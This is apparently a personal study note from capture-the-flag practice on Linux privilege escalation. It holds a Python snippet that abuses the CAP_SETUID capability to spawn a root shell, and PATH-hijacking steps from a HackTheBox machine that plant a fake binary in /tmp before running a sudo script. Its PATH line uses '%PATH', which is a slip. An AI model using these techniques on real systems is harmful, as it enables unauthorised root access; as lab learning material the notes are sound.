# General Concepts

**Note:** I made this cuz there are some concepts that I'm not very sure of categorizing, so yeah.

## CAP_SETUID bit

If this bit is on in a _python_ binary, refer to [**GTFOBins**](https://gtfobins.github.io/gtfobins/python/#capabilities) for further details.

But basically, if you see this bit set on _python_, use the following script:

```
import os
os.setuid(0)
os.system("/bin/bash")
```

Should be pretty self-explanatory.

## Abusing misconfigured PATH variable

```
PATH=/tmp:%PATH
```

That's the basic concept of how to abuse it. I don't fully understand the logic, but essentially, if a file (preferably with privileged access) does not have an absolute file path, you can make a temporary file (hence, **/tmp** being used in the file path since I usually do it there) that gives you a shell, set execute permissions for it, then reference that **PATH** before the file that actually has the escalated privileges, then it'll execute this temporary file and give you a shell.

Here's an example, based on [**Photobomb**](../../HTB/Photobomb/Writeup.md):

```
1. cd /tmp
2. echo "/bin/bash" > [
3. chmod +x [
4. sudo PATH=/tmp:%PATH /opt/cleanup.sh
```

Where:
```cleanup.sh``` = file with sudo perms
```[``` = binary that can be manipulated (supposedly, in the machine, other bins were vulnerable too apparently)
